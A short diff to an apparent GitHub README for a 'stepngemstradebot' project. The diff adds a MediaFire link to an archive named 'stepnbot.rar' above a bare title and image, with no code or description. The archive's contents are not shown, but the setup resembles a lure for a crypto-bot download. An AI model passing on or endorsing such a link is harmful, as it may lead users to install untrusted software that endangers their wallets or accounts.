@@ -1,3 +1,4 @@
+https://www.mediafire.com/file/f724aq85wdykdvj/stepnbot.rar/file
 # stepngemstradebot
 stepngemstradebot
 ![image](https://user-images.githubusercontent.com/107195982/173053389-d424163a-846e-41d6-8033-331655bac4b8.png)
